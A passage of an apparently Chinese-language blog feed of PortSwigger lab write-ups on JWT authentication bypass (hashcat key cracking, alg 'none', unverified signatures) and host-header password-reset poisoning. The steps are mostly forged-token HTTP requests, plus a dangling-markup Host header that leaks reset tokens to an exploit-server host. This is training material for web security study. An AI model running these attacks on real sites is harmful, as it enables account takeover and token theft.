cUJKQkVmcWlCSDBMZE5vVVEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.uJx5uzr5ehWN22wY8AmWV8Rb5ZP1yZxyYXrRFPBb2rCd-rVnXKvARF9d6BbyOb9xADVCnxyEK5P5I5F5MP5qL_rioisbnzezckGs32XyeR2_0NRTB76iZnhYw7zBnLbyHFKUGqGycKvsnKmxG5cUVTdE-2buLUTThxOjgaM1B0keKL2Crw6woqNaeX1d2QSLRVX-i9NHyDj_UMCoOiKkL35LAoTiBV4-JUH90IFBrYvzTm21mPl3tROiwxEb7POyUZVC7IWQ08LaH8XgCyQwB14XSCnwnHuqzLS2QG1-U5TPkhCYthFVXteyEm4TiYF0PDSampFAsYcLibq2veda2A&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>Lab: JWT authentication bypass via weak signing key</title><link>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-weak-signing-key/</link><pubDate>Fri, 27 Dec 2024 21:33:04 +0800</pubDate><guid>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-weak-signing-key/</guid><description>Lab description Solution 点击右上角My account并使用wiener:peter登录 登录后跳转至个人页面，请求如下 GET /my-account?id=wiener HTTP/2 Cookie: session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoid2llbmVyIn0.892fbasPXIbgCheJYfaLEcam5WlhWqdHIEts_piqbqo 根据题目提示，使用hashcat与wordlist of common secrets暴力破解jwt密钥 $ hashcat -a 0 -m 16500 eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoid2llbmVyIn0.892fbasPXIbgCheJYfaLEcam5WlhWqdHIEts_piqbqo /tmp/jwt.secrets.list ... :secret1 根据hashcat爆破结果密钥为secret1 使用jwt.io修改JWT，首先在VERIFY SIGNATURE中的your-256-bit-secret栏位替代为secret1 修改JWT PAYLOAD中的sub为administrator 重放步骤2请求，填入修改后的JWT，并修改url为/admin GET /admin HTTP/2 Cookie: session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ip0VbwwneBvqHD5O0ff0wE0Hpobf5NWIHy2g6wAKxJg HTTP/2 200 OK &amp;lt;div&amp;gt; &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt; &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt; 修改上述请求url为/admin/delete?username=carlos并且再次发送请求，即可解题 GET /admin/delete?username=carlos HTTP/2 Cookie: session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ip0VbwwneBvqHD5O0ff0wE0Hpobf5NWIHy2g6wAKxJg HTTP/2 302 Found</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-weak-signing-key-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>登录后跳转至个人页面，请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /my-account?id=wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoid2llbmVyIn0.892fbasPXIbgCheJYfaLEcam5WlhWqdHIEts_piqbqo&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据题目提示，使用&lt;a href="https://hashcat.net/hashcat/">hashcat&lt;/a>与&lt;a href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">wordlist of common secrets&lt;/a>暴力破解jwt密钥
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hashcat -a &lt;span style="color:#ae81ff">0&lt;/span> -m &lt;span style="color:#ae81ff">16500&lt;/span> eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoid2llbmVyIn0.892fbasPXIbgCheJYfaLEcam5WlhWqdHIEts_piqbqo /tmp/jwt.secrets.list
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>... :secret1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据&lt;code>hashcat&lt;/code>爆破结果密钥为&lt;code>secret1&lt;/code>&lt;/li>
&lt;li>使用&lt;a href="https://jwt.io/">jwt.io&lt;/a>修改JWT，首先在&lt;code>VERIFY SIGNATURE&lt;/code>中的&lt;code>your-256-bit-secret&lt;/code>栏位替代为&lt;code>secret1&lt;/code>
&lt;img alt="Edit jwt" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-weak-signing-key-2.jpg">&lt;/li>
&lt;li>修改&lt;code>JWT PAYLOAD&lt;/code>中的&lt;code>sub&lt;/code>为&lt;code>administrator&lt;/code>
&lt;img alt="Edit jwt" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-weak-signing-key-3.jpg">&lt;/li>
&lt;li>重放步骤2请求，填入修改后的JWT，并修改url为&lt;code>/admin&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ip0VbwwneBvqHD5O0ff0wE0Hpobf5NWIHy2g6wAKxJg&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;div&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/div&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改上述请求url为&lt;code>/admin/delete?username=carlos&lt;/code>并且再次发送请求，即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ip0VbwwneBvqHD5O0ff0wE0Hpobf5NWIHy2g6wAKxJg&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>Lab: JWT authentication bypass via flawed signature verification</title><link>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification/</link><pubDate>Thu, 26 Dec 2024 23:25:54 +0800</pubDate><guid>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification/</guid><description>Lab description Solution 点击右上角My account并使用wiener:peter登录 登录后跳转至个人页面，请求如下 GET /my-account?id=wiener HTTP/2 Cookie: session=eyJraWQiOiI5ZDgzYzk5ZC03MDQyLTQxOTYtYTY0Ny1mZWE5MjUzNmY5NjQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTIzMDYyOCwic3ViIjoid2llbmVyIn0.WDgCWkjhNJTKUUWQXtSWZeNvucgq3tI2jolposyLR_6Wb1oalFTHet06RriaBSNRg9L_ymsEKBLggXXHuMiTxYSGIS6WkKbEPuu7RvwXQOvWG2lLOrtB5nGF50qBY1Byw7OLEyzDsij1mkLcHhy8b5limYlHOprtOnlX8J8zST2G1aG6esITtWEuJjHPaNrCnOHgVSaFzr4RpW0fd1P6kGzin47G71MqsCwOueH7DHn2_ySnX0Wkw_Ehwkd_EMjcAmT-l-ecD3jsFBaaIOna0HtLntFf7eRT3CdXLEHmwkTmewAjrHTgV8e1CcpiAXcEFdQuXxU4pYF0yBXvwIpDeg 将JWT header中的alg从RS256修改为none并点击Apply changes 将JWT payload中的sub从wiener修改为administrator并点击Apply changes 将JWT signature删除 将url修改为/admin，在浏览器开启请求即可看见Admin panel 将上述url修改为/admin/delete?username=carlos并再次在浏览器开启请求即可解题</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>登录后跳转至个人页面，请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /my-account?id=wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiI5ZDgzYzk5ZC03MDQyLTQxOTYtYTY0Ny1mZWE5MjUzNmY5NjQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTIzMDYyOCwic3ViIjoid2llbmVyIn0.WDgCWkjhNJTKUUWQXtSWZeNvucgq3tI2jolposyLR_6Wb1oalFTHet06RriaBSNRg9L_ymsEKBLggXXHuMiTxYSGIS6WkKbEPuu7RvwXQOvWG2lLOrtB5nGF50qBY1Byw7OLEyzDsij1mkLcHhy8b5limYlHOprtOnlX8J8zST2G1aG6esITtWEuJjHPaNrCnOHgVSaFzr4RpW0fd1P6kGzin47G71MqsCwOueH7DHn2_ySnX0Wkw_Ehwkd_EMjcAmT-l-ecD3jsFBaaIOna0HtLntFf7eRT3CdXLEHmwkTmewAjrHTgV8e1CcpiAXcEFdQuXxU4pYF0yBXvwIpDeg&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>将&lt;code>JWT header&lt;/code>中的&lt;code>alg&lt;/code>从&lt;code>RS256&lt;/code>修改为&lt;code>none&lt;/code>并点击&lt;code>Apply changes&lt;/code>
&lt;img alt="Edit jwt header" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-2.jpg">
&lt;img alt="Edit jwt header" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-3.jpg">&lt;/li>
&lt;li>将&lt;code>JWT payload&lt;/code>中的&lt;code>sub&lt;/code>从&lt;code>wiener&lt;/code>修改为&lt;code>administrator&lt;/code>并点击&lt;code>Apply changes&lt;/code>
&lt;img alt="Edit jwt payload" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-4.jpg">
&lt;img alt="Edit jwt payload" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-5.jpg">&lt;/li>
&lt;li>将&lt;code>JWT signature&lt;/code>删除
&lt;img alt="Edit jwt signature" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-6.jpg">
&lt;img alt="Edit jwt signature" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification-7.jpg">&lt;/li>
&lt;li>将url修改为&lt;code>/admin&lt;/code>，在浏览器开启请求即可看见&lt;code>Admin panel&lt;/code>&lt;/li>
&lt;li>将上述url修改为&lt;code>/admin/delete?username=carlos&lt;/code>并再次在浏览器开启请求即可解题&lt;/li>
&lt;/ol></content></item><item><title>Lab: JWT authentication bypass via unverified signature</title><link>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-unverified-signature/</link><pubDate>Thu, 26 Dec 2024 22:31:15 +0800</pubDate><guid>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-unverified-signature/</guid><description>Lab description Solution 点击右上角My account并使用wiener:peter登录 登录后跳转至个人页面，请求如下 GET /my-account?id=wiener HTTP/2 Cookie: session=eyJraWQiOiJkZTk5MWIwNi05ZWMzLTQ4MmQtYjJiZi04ZGM0MzJhNzJkNDkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTIyOTM3Miwic3ViIjoid2llbmVyIn0.E1lgjh_mRmyY7KohOUDUurkhpfrir7yqJv6GvOVUuj1ZWK2ZsuJyKf5E2yWvbGdtz2w9b6-w5zVnsSxKOJUh8uLyn5erVbA4GZJoG9SN18Py8zYAVJf45pJA8qYEHQ2-VMRq2mStg_q5tN7hThr-iIcWhqfWqwuJ52c5Q0RXMUU6Uhd894QYkOIa5cewvBpkVWHFigf0OI3rzYF-GcmyonamnYz9fVmLx9UAJ0paYpDE19quvH0NwGrWRlEdvyNlXKy4d-jIxx0SuKnIMoP35NbhT2PDiDyp6F15HyQj-ZvVfp1Ry--uoUJ1vRkK1Xu66_JoDtqfj0_bGyuzl_CgLw 将JWT payload中的sub从wiener修改为administrator并点击Apply changes，同时修改url为/admin 在浏览器开启请求即可看见Admin panel，将上述url修改为/admin/delete?username=carlos并再次在浏览器开启请求即可解题</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-unverified-signature-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>登录后跳转至个人页面，请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /my-account?id=wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiJkZTk5MWIwNi05ZWMzLTQ4MmQtYjJiZi04ZGM0MzJhNzJkNDkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTIyOTM3Miwic3ViIjoid2llbmVyIn0.E1lgjh_mRmyY7KohOUDUurkhpfrir7yqJv6GvOVUuj1ZWK2ZsuJyKf5E2yWvbGdtz2w9b6-w5zVnsSxKOJUh8uLyn5erVbA4GZJoG9SN18Py8zYAVJf45pJA8qYEHQ2-VMRq2mStg_q5tN7hThr-iIcWhqfWqwuJ52c5Q0RXMUU6Uhd894QYkOIa5cewvBpkVWHFigf0OI3rzYF-GcmyonamnYz9fVmLx9UAJ0paYpDE19quvH0NwGrWRlEdvyNlXKy4d-jIxx0SuKnIMoP35NbhT2PDiDyp6F15HyQj-ZvVfp1Ry--uoUJ1vRkK1Xu66_JoDtqfj0_bGyuzl_CgLw&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>将&lt;code>JWT payload&lt;/code>中的&lt;code>sub&lt;/code>从&lt;code>wiener&lt;/code>修改为&lt;code>administrator&lt;/code>并点击&lt;code>Apply changes&lt;/code>，同时修改url为&lt;code>/admin&lt;/code>
&lt;img alt="Edit jwt" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-unverified-signature-2.jpg">
&lt;img alt="Edit jwt" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-unverified-signature-3.jpg">&lt;/li>
&lt;li>在浏览器开启请求即可看见&lt;code>Admin panel&lt;/code>，将上述url修改为&lt;code>/admin/delete?username=carlos&lt;/code>并再次在浏览器开启请求即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Password reset poisoning via dangling markup</title><link>/portswigger-posts/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup/</link><pubDate>Wed, 25 Dec 2024 21:54:57 +0800</pubDate><guid>/portswigger-posts/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上方&lt;code>My account&lt;/code>、&lt;code>Forgot password?&lt;/code>、输入&lt;code>wiener&lt;/code>，对应请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0aa200d40484120c814c03f80053006a.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=0RH1WeiVaNEoNoLBprR1iDSxMeqS0mYn&amp;amp;username=wiener
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>点击上方&lt;code>Go to exploit server&lt;/code>、&lt;code>Email client&lt;/code>查看重置密码邮件
&lt;img alt="Email client" src="/img/2024/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup-2.jpg">&lt;/li>
&lt;li>点击&lt;code>View raw&lt;/code>，显示内容如下，且使用&lt;code>domPurify-2.0.15.js&lt;/code>对内容进行处理
&lt;img alt="View raw" src="/img/2024/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup-3.jpg">&lt;/li>
&lt;li>尝试重放步骤1请求，并在最后加上随机字符串
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0aa200d40484120c814c03f80053006a.web-security-academy.net:str&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=0RH1WeiVaNEoNoLBprR1iDSxMeqS0mYn&amp;amp;username=wiener
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>观察到&lt;code>View raw&lt;/code>忠实反映请求中的&lt;code>Host: 0aa200d40484120c814c03f80053006a.web-security-academy.net:str&lt;/code>
&lt;img alt="Email client" src="/img/2024/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup-4.jpg">
&lt;img alt="View raw" src="/img/2024/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup-5.jpg">&lt;/li>
&lt;li>再次尝试重放步骤1请求，并在最后加上格式为&lt;code>'&amp;lt;a href=&amp;quot;//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?&lt;/code>的字符串，注入一个指向exploit server的dangling-markup payload
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0aa200d40484120c814c03f80053006a.web-security-academy.net:&amp;#39;&amp;lt;a href=&amp;#34;//exploit-0a4b0006041712fb81df027f013500d4.exploit-server.net/?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=0RH1WeiVaNEoNoLBprR1iDSxMeqS0mYn&amp;amp;username=wiener
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>查看&lt;code>Email client&lt;/code>与&lt;code>View raw&lt;/code>
&lt;img alt="Email client" src="/img/2024/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup-6.jpg">
&lt;img alt="View raw" src="/img/2024/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup-7.jpg">&lt;/li>
&lt;li>尝试重放步骤6请求，并将&lt;code>username&lt;/code>修改为&lt;code>carlos&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0aa200d40484120c814c03f80053006a.web-security-academy.net:&amp;#39;&amp;lt;a href=&amp;#34;//exploit-0a4b0006041712fb81df027f013500d4.exploit-server.net/?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=0RH1WeiVaNEoNoLBprR1iDSxMeqS0mYn&amp;amp;username=carlos
